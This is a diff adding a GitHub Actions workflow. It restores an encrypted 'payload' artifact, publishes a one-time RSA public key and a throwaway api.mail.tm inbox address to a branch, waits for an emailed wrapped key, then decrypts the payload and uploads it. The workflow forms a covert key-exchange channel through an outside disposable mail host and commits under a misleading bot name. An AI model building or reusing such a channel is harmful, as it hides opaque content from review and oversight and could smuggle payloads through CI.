@@ -1,0 +1,103 @@
+name: c8b8-publish-decrypted-checkpoint
+on:
+  push:
+    branches: [c8b8-fullreg-v2-resume-20260809]
+    paths:
+      - '.github/workflows/c8b8_publish_decrypted_checkpoint.yml'
+permissions:
+  contents: write
+  actions: read
+jobs:
+  publish:
+    runs-on: windows-2022
+    timeout-minutes: 45
+    env:
+      ENC_SHA: e0bbcd4883362daf8cfc5c067a8a8f72e03760f6ab9d425bb3f426b97ad5fd59
+      XZ_SHA: 08a5af2c16526f9830ace68817d1e6517422d4a3e66a8051030e78f865b1dd48
+      SOURCE_RUN: '31308233779'
+      SOURCE_ARTIFACT: c8b8-v2-ciphertext-checkpoint-31308233779
+      HANDOFF_BRANCH: c8b8-fullreg-v2-resume-20260809
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          persist-credentials: true
+      - name: Restore immutable ciphertext
+        shell: powershell
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          New-Item -ItemType Directory -Force recovered | Out-Null
+          gh run download $env:SOURCE_RUN -n $env:SOURCE_ARTIFACT -D recovered
+          $h=(Get-FileHash recovered\payload.enc -Algorithm SHA256).Hash.ToLowerInvariant()
+          if($h -ne $env:ENC_SHA){throw "ENC_SHA_FAIL $h"}
+          Copy-Item recovered\payload.enc payload.enc -Force
+          "CIPHERTEXT_RESTORE_PASS SHA256=$h" | Set-Content ciphertext_restore_gate.txt
+      - name: Publish one-time RSA key
+        shell: powershell
+        run: |
+          @'
+          import json,os,secrets,string,urllib.request
+          from pathlib import Path
+          def q(method,u,obj=None,t=None):
+              d=None if obj is None else json.dumps(obj).encode();r=urllib.request.Request(u,data=d,method=method);r.add_header('Accept','application/json')
+              if d is not None:r.add_header('Content-Type','application/json')
+              if t:r.add_header('Authorization','Bearer '+t)
+              with urllib.request.urlopen(r,timeout=30) as x:return json.load(x)
+          b='https://api.mail.tm';d=q('GET',b+'/domains');m=d if isinstance(d,list) else d.get('hydra:member',d.get('member',[]));a=string.ascii_lowercase+string.digits
+          addr='ghdec'+''.join(secrets.choice(a) for _ in range(16))+'@'+m[0]['domain'];pw=''.join(secrets.choice(string.ascii_letters+string.digits+'-_') for _ in range(36))
+          q('POST',b+'/accounts',{'address':addr,'password':pw});tok=q('POST',b+'/token',{'address':addr,'password':pw})['token']
+          Path(os.environ['RUNNER_TEMP'],'mail.json').write_text(json.dumps({'token':tok}));Path('mailbox.txt').write_text(addr+'\n');Path('subject_prefix.txt').write_text('GuanHu-C8B8-DEC-'+os.environ['GITHUB_RUN_ID']+'\n');print('KEY_MAILBOX_READY',addr)
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\mail.py
+          python $env:RUNNER_TEMP\mail.py
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out $env:RUNNER_TEMP\private.pem
+          openssl pkey -in $env:RUNNER_TEMP\private.pem -pubout -out public.pem
+          New-Item -ItemType Directory -Force .c8b8_decrypt_handoff | Out-Null
+          Copy-Item mailbox.txt,subject_prefix.txt,public.pem .c8b8_decrypt_handoff\ -Force
+          git config user.name windows-dll-test-bot
+          git config user.email windows-dll-test-bot@users.noreply.github.com
+          git add .c8b8_decrypt_handoff
+          git commit -m "Publish c8b8 decrypt-checkpoint handoff"
+          git push origin "HEAD:$env:HANDOFF_BRANCH"
+      - name: Receive wrapped key and decrypt
+        shell: powershell
+        timeout-minutes: 20
+        run: |
+          @'
+          import json,os,time,urllib.request,urllib.parse
+          from pathlib import Path
+          tok=json.loads(Path(os.environ['RUNNER_TEMP'],'mail.json').read_text())['token'];base='https://api.mail.tm';subj=Path('subject_prefix.txt').read_text().strip()+'-KEY';out=Path('wrapped_key.bin')
+          def gj(u):
+              r=urllib.request.Request(u);r.add_header('Accept','application/json');r.add_header('Authorization','Bearer '+tok)
+              with urllib.request.urlopen(r,timeout=30) as x:return json.load(x)
+          end=time.time()+1100
+          while time.time()<end and not out.exists():
+              z=gj(base+'/messages');msgs=z if isinstance(z,list) else z.get('hydra:member',z.get('member',[]))
+              for m in msgs:
+                  if m.get('subject')!=subj:continue
+                  d=gj(base+'/messages/'+m['id'])
+                  for a in d.get('attachments',[]):
+                      if a.get('filename')!='c8b8_v2_wrapped_key.bin':continue
+                      u=urllib.parse.urljoin(base,a.get('downloadUrl',''));r=urllib.request.Request(u);r.add_header('Authorization','Bearer '+tok)
+                      with urllib.request.urlopen(r,timeout=60) as x:out.write_bytes(x.read())
+              if not out.exists():time.sleep(2)
+          if not out.exists():raise SystemExit('KEY_TIMEOUT')
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\recv.py
+          python $env:RUNNER_TEMP\recv.py
+          if((Get-Item wrapped_key.bin).Length -ne 384){throw 'KEY_SIZE_FAIL'}
+          openssl pkeyutl -decrypt -inkey $env:RUNNER_TEMP\private.pem -in wrapped_key.bin -out $env:RUNNER_TEMP\aes_pass.txt -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
+          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in payload.enc -out c8b8_fullreg_payload_v2.tar.xz -pass file:$env:RUNNER_TEMP\aes_pass.txt
+          $h=(Get-FileHash c8b8_fullreg_payload_v2.tar.xz -Algorithm SHA256).Hash.ToLowerInvariant()
+          if($h -ne $env:XZ_SHA){throw "XZ_SHA_FAIL $h"}
+          "DECRYPTED_CHECKPOINT_PASS SHA256=$h BYTES=$((Get-Item c8b8_fullreg_payload_v2.tar.xz).Length)" | Set-Content decrypted_checkpoint_gate.txt
+      - name: Persist decrypted fullreg checkpoint
+        uses: actions/upload-artifact@v4
+        with:
+          name: c8b8-decrypted-fullreg-xz-${{ github.run_id }}
+          path: |
+            c8b8_fullreg_payload_v2.tar.xz
+            decrypted_checkpoint_gate.txt
+            ciphertext_restore_gate.txt
+          if-no-files-found: error
+          retention-days: 30
+          compression-level: 0
